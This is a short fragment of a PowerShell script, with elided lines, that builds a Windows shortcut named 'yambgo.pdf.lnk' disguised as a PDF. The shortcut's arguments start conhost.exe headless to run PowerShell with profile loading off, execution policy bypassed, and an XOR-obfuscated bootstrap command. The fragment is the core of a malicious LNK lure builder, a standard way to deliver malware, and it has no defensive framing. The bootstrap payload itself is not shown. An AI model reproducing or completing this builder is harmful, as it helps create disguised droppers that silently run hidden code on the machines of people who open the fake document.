...
# Target: conhost.exe --headless powershell.exe -NoP -EP Bypass -Command "<xor bootstrap>"
...
$clean = $raw -replace "''", "'"
$argsStr = '--headless powershell.exe -NoP -EP Bypass -Command "' + $clean + '"'
$lnkPath = "C:\Users\Sly Wnr\Downloads\Telegram Desktop\Project-Kid-main\yamgbo\yambgo.pdf.lnk"
